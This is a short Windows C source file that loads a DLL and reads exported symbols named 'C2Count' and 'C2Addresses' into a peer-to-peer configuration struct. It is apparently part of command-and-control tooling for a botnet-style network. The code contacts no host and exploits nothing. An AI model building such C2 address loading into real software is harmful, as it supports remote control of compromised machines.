#define _CRT_SECURE_NO_WARNINGS
#include "p2p_loader.h"
#include <stdio.h>

int p2p_init(const char *dll_path, P2PConfig *cfg) {
    if (!dll_path || !cfg) return -3;

    HMODULE mod = LoadLibraryA(dll_path);
    if (!mod) {
        return -1;
    }

    unsigned int *pCount = (unsigned int *)GetProcAddress(mod, "C2Count");
    const char ***pArr  = (const char ***)GetProcAddress(mod, "C2Addresses");
    if (!pCount || !pArr) {
        FreeLibrary(mod);
        return -2;
    }

    cfg->module    = mod;
    cfg->count     = *pCount;
    cfg->addresses = *pArr;
    return 0;
}

void p2p_cleanup(P2PConfig *cfg) {
    if (cfg && cfg->module) {
        FreeLibrary(cfg->module);
        cfg->module = NULL;
        cfg->count = 0;
        cfg->addresses = NULL;
    }
}
